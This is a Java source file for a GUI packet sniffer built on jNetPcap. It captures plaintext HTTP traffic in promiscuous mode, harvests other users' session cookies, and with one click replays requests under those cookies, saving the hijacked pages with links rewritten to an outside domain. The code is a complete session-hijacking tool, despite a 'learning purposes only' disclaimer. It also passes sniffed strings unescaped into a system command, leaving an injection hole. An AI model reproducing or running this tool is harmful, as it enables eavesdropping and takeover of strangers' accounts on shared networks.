import java.awt.BorderLayout;
import java.awt.Container;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JOptionPane;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.table.DefaultTableModel; 

// ===================>
/* for device listing */
import java.util.Arrays;
import java.util.ArrayList;  
import java.util.Date;  
import java.util.List;
import java.util.*;
import java.text.*; 
import java.io.*; 
import java.io.IOException;

/* PCap */  
import org.jnetpcap.Pcap;  
import org.jnetpcap.PcapIf;  
import org.jnetpcap.packet.PcapPacket;  
import org.jnetpcap.packet.PcapPacketHandler; 

import org.jnetpcap.nio.JBuffer;

/* Protocols */ 
import org.jnetpcap.protocol.network.Ip4;
import org.jnetpcap.protocol.network.Ip6;
import org.jnetpcap.protocol.tcpip.Http;
import org.jnetpcap.protocol.tcpip.Tcp;

/* HTTP Requests */
import org.jnetpcap.protocol.tcpip.Http.ContentType;  
import org.jnetpcap.protocol.tcpip.Http.Request;  
import org.jnetpcap.protocol.tcpip.Http.Response;

/* FormatUtils */
import org.jnetpcap.packet.format.FormatUtils;

/* GZIP */
import java.io.*;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.util.zip.GZIPInputStream;
import java.io.ByteArrayInputStream;

/* Host IP & MAC */
import java.net.InetAddress;
import java.util.Enumeration;
import java.net.NetworkInterface;
    
public class Sniffer { 

public static Ip4 ip = new Ip4();
public static Tcp tcp = new Tcp();
public static Http http = new Http(); 

/* variables */
public static byte[] mymac = new byte[5];
public static InetAddress inet;
public static Enumeration e;
public static NetworkInterface n;
public static Enumeration ee;

/* debugger */
public static int debug = 0;
public static FileWriter fw;
public static BufferedWriter bw;
public static PrintWriter writer; // = new PrintWriter("the-file-name.txt", "UTF-8");
// <============================


  private static DefaultTableModel model;
  private JTable table;

  public Sniffer() {
  
    super();
    
    model = new DefaultTableModel();
    model.addColumn("URL");
    model.addColumn("Request Method");
    model.addColumn("Cookies");
    model.addColumn("...");

    table = new JTable(model);
    table.addMouseListener(new java.awt.event.MouseAdapter() {
        @Override
        public void mouseClicked(java.awt.event.MouseEvent evt) {
            int row = table.rowAtPoint(evt.getPoint());
            int col = table.columnAtPoint(evt.getPoint());
            if (row >= 0 && col == 3) {
            
                //System.out.println("Clicked on " + row + " -> " + col + "\n");
                System.out.println("Call " + table.getValueAt(row, 0) + " with cookie " + table.getValueAt(row, 2)); // column 0 to get the url
                
                String called_url = table.getValueAt(row, 0).toString();
                         
                if(checkfilter(called_url)) {
                    
                    // Do something
                    String origcookie = table.getValueAt(row, 2).toString();
                    String cookiecontent[] = origcookie.split(";");
                    
                    if(!cookiecontent[0].equals("xload=1")) {
                    
                        String cookiemodded = "xload=1;" + origcookie;
                              
                        String command = "java HTTP_GET_REQUEST \"" + table.getValueAt(row, 0) + "\" \"" + cookiemodded + "\"";
                        //System.out.println(command);
                                    
                        try { 
                        
                            
                            String erg = execCmd(command);
                            //String HtmlContent = execCmd("java Connection \"" + called_url + "\"");
                            //String HtmlContent = execCmd("java HtmlContent " + Connection);
                             

                            BufferedWriter writer = new BufferedWriter(new FileWriter(row + ".html"));
                            
                            erg = erg.replaceAll("href=\"[^http]", "href=\"http://simplepress.ml/");
                            
                            try{
                                writer.write(erg);
                            }catch(IOException e){
                                e.printStackTrace();
                                return;
                            }
                            
                            writer.close(); 
                            //execCmd("java HtmlContent \"" + row + ".html\"");
                            //execCmd("start firefox \"file:///./" + row + ".html\"");
                            
                        } catch(IOException ioe) {
                            ioe.printStackTrace();
                        }
                    
                    }
                              
                }
            
            }
        }
    });

    JButton addButton = new JButton("Add Philosopher");
    addButton.addActionListener(new ActionListener() {
      public void actionPerformed(ActionEvent event) {
        String[] philosopher = { "", "", "" };
        model.addRow(philosopher);
      }
    });

    JButton removeButton = new JButton("Remove Selected Row");
    removeButton.addActionListener(new ActionListener() {
      public void actionPerformed(ActionEvent event) {
        model.removeRow(table.getSelectedRow());
      }
    });
    JPanel inputPanel = new JPanel();
    //inputPanel.add(addButton);
    inputPanel.add(removeButton);

    Container container = Global.uniFrame.getContentPane();
    container.add(new JScrollPane(table), BorderLayout.CENTER);
    container.add(inputPanel, BorderLayout.NORTH);

    Global.uniFrame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    Global.uniFrame.setSize(800, 300);
    Global.uniFrame.setVisible(true);              
        
        /* Print welcome message */
        System.out.println(
        "\n[***] Support: manuel.zarat@gmail.com\n" +
        "\n[***] Dieses Programm dient ausschließlich Lernzwecken.\n" +
        "[***] Absolut keine Garantie, daher Nutzung auf eigene Gefahr.\n" + 
        "[***] Bitte beachten Sie die jeweils geltenden Gesetze!!!\n");    
        
        List<PcapIf> alldevs = new ArrayList<PcapIf>();
        StringBuilder errbuf = new StringBuilder();  
                
        int interfaces = Pcap.findAllDevs(alldevs, errbuf);
        
        String aif = "";
        
        String choices[] = new String[alldevs.size()];
        int choices_counter = 0;
        choices[0] = "select one";
        
        try {           
                
            e = NetworkInterface.getNetworkInterfaces();
            while (e.hasMoreElements()) {
                
                n = (NetworkInterface)e.nextElement();                                      
                ee = n.getInetAddresses();
                
                    
                if (ee.hasMoreElements()) {
                  
                    //aif += n.getDisplayName() + " - ";
                    
                    try { 
                    //System.out.println(asString(n.getHardwareAddress()));
                    aif += asString(n.getHardwareAddress()) + " - "; 
                    }catch(Exception e) {  }
                        
                }
                int foundadresses = 0;        
                while (ee.hasMoreElements()) {
                                    
                    InetAddress ninet = (InetAddress)ee.nextElement();
                    foundadresses++;    
                    if(null != ninet && foundadresses == 1) {
                                                  
                        //System.out.println("\n\n"+n.getDisplayName());
                        //System.out.println(ninet);
                        aif += ninet + "\n\n";
                                                  
                    }
                        
                }
                                		
            }
                    
            //System.out.println("\n"+aif+"\n");
                
        }catch(Exception see) {} 
        
        
        
        String t_out = "";      
        int i = 0;
        for (PcapIf device : alldevs) {
                   
            String description = (device.getDescription() != null) ? device.getDescription() : "keine Beschreibung";
        
            try {
                
                //System.out.println("[***] #"+(i++)+": "+description+" : " + asString(device.getHardwareAddress())); 
                choices[i] = i + " " + asString(device.getHardwareAddress()); 
                i++;                      
            }catch(Exception e) {} 
                   
        }  
        //System.out.println(t_out);
        
        if (interfaces == Pcap.NOT_OK || alldevs.isEmpty()) {
                
            System.out.println("[!!!] Konnte Interfaces nicht auslesen: " + errbuf.toString() + "\n");  
            return; 
                
        }

        String input = (String) JOptionPane.showInputDialog(null, aif,"Konfiguration", JOptionPane.QUESTION_MESSAGE, null, choices, choices[1]);
        int eingabe = new Integer(input.substring(0,1));
        System.out.println(""+eingabe);
               
        PcapIf device = alldevs.get(eingabe);
               
        System.out.print("\n");  
       
        int snaplen = 64 * 1024;           // full packets >=64 bytes /truncated/gzipped?
        int flags = Pcap.MODE_PROMISCUOUS; // all packets  
        int timeout = 10 * 1000;  
        Pcap pcap = Pcap.openLive(device.getName(), snaplen, flags, timeout, errbuf);  
      
        if (pcap == null) {              
            System.err.printf("[!!!] Error opening interface: " + errbuf.toString());  
            return; 
        } 

        PcapPacketHandler<String> jpacketHandler = new PcapPacketHandler<String>() {  
      
            public void nextPacket(PcapPacket packet, String user) {  

                if(packet.hasHeader(tcp) && packet.hasHeader(http) && tcp.destination() == 80 && http.fieldValue(Request.RequestUrl) != null) {                
                    if(checkfilter(http.fieldValue(Request.RequestUrl)) && packet.hasHeader(ip) && http.fieldValue(Request.Cookie) != null) {
                    addEntry("http://" + http.fieldValue((Http.Request.Host.Host))+http.fieldValue(Request.RequestUrl), http.fieldValue(Request.RequestMethod), http.fieldValue(Request.Cookie), http.fieldValue(Request.User_Agent));
                    }
                }
                                      
            } 
             
        };  
       
        int running = pcap.loop(Pcap.LOOP_INFINATE, jpacketHandler, "sniffing..."); 
             
        if (running == Pcap.LOOP_INTERRUPTED) {
    
        		print("Handler indicates that 2 tracking variables in 2 objects, did not match");
              
        } else if (running != Pcap.OK) {
        			
            print("Error occured: " + pcap.getErr());
                
        }
            
        pcap.close();
        try { bw.close(); }catch(IOException ioe) {}   
    
  } 
  public static void addEntry(String url, String method, String cookie, String useragent) {
        String[] philosopher = { url, method, cookie, useragent};
        model.addRow(philosopher);  
  }
  public static class Global{
      public static JFrame uniFrame = new JFrame();
  }
  private static void createGUI(){
      new Sniffer();
  }
  public static void main(String args[]) {
      createGUI();
  }

    public static void print(String out) {
        
        System.out.print(out);
        writer.println(out); // write to logfile    
        
    }
      
      private static String asString(final byte[] mac) { 
            
        final StringBuilder buf = new StringBuilder();
                 
            for (byte b : mac) {  
                   
            if (buf.length() != 0) { 
                        
                buf.append(':'); 
                            
            }  
                       
            if (b >= 0 && b < 16) {  
                       
                buf.append('0');  
                           
            }  
                       
            buf.append(Integer.toHexString((b < 0) ? b + 256 : b).toUpperCase());
                         
            }  
                 
        return buf.toString(); 
         
    }
    
    public static boolean checkfilter(String s) {
        String filters[] = {".css",".js",".ico",".ICO",".png",".jpg",".jpeg",".gif"};
        for(int i = 0; i<filters.length; i++) {
            if(s.indexOf(filters[i]) != -1) {
                return false;
            }
        }
        return true;
    }
    
    public static String execCmd(String cmd) throws java.io.IOException {
            java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
            return s.hasNext() ? s.next() : "";
    }
    
}
